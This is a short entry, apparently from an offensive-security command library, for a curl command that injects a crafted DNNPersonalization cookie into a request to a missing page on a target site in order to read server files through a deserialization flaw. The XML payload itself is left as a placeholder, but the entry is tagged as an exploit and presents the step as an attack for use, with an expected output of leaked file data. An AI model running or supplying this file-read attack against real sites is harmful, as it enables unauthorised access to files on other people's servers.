---
id: uuid-placeholder-c4
data: >-
  curl -v "https://target.com/nonexistent-page" -H "Cookie:
  DNNPersonalization=<read-xml>" > response.html
tags:
  - file-read
  - exploit
type: command
output: File contents in body
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.200Z'
verified: false
validated: true
submitted: true
---
# curl-read-payload

## Command

```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<read-xml>" > response.html
```

## Description

Injects payload for file read and captures output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> file` | Save response | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: ..." https://target.com/404 > out.txt
```

## Expected Output

Response containing read file data.

## Related

- [[Related Procedure: Exploit-Deserialization-for-Arbitrary-File-Read]]
